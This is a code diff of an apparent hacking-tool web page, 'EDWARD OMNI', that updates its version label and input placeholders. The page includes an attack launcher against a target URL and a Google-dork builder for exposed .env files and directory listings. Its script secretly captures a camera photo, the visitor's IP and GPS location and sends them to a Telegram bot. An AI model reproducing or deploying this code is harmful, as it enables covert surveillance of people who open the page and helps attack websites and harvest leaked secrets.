@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="manifest" href="manifest.json">
-    <title>EDWARD OMNI V.155</title>
+    <title>EDWARD OMNI V.156</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --gold: #ffd700; }
         * { box-sizing: border-box; transition: 0.2s; }
@@ -35,7 +35,7 @@
 <body>
     <div id="toast"></div>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.155</p>
+        <p class="master-name">EDWARD OMNI V.156</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -44,21 +44,21 @@
 
     <div class="card">
         <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Analyze Link...">
+        <input type="text" id="scanInput" placeholder="Target">
         <button class="btn btn-scan" onclick="analyzeLink()">⚡ ANALYZE LINK</button>
         <div id="scanLog" class="log-box"></div>
     </div>
 
     <div class="card">
         <h3>🔥 NUCLEAR BRUTAL</h3>
-        <input type="text" id="targetAtk" placeholder="Target URL">
+        <input type="text" id="targetAtk" placeholder="Target">
         <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
         <div id="atkLog" class="log-box"></div>
     </div>
 
     <div class="card">
         <h3>🔍 DORKING MANTRA</h3>
-        <input type="text" id="dorkTarget" placeholder="Target (ex: syfe.com)">
+        <input type="text" id="dorkTarget" placeholder="Target">
         <select id="dorkType">
             <option value="dir">Directory Listing</option>
             <option value="env">Env Files (.env)</option>
@@ -127,7 +127,8 @@
         }
 
         function castDork() {
-            const target = document.getElementById('dorkTarget').value || "syfe.com";
+            const target = document.getElementById('dorkTarget').value;
+            if(!target) return showToast("TARGET EMPTY!");
             const type = document.getElementById('dorkType').value;
             let m = "site:" + target + (type === 'dir' ? ' intitle:index.of' : type === 'env' ? ' filetype:env' : ' -www');
             showToast("MANTRA CASTED!");
@@ -160,7 +161,7 @@
                     const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                     
                     const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b);
-                    fd.append('caption', "🔱 V.155 OMNI\n🌐 IP: "+ipD.ip+"\n📍 MAP: http://google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
+                    fd.append('caption', "🔱 V.156 OMNI\n🌐 IP: "+ipD.ip+"\n📍 MAP: http://google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
                     await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {method: "POST", body: fd});
                     
                     s.getTracks().forEach(t => t.stop());
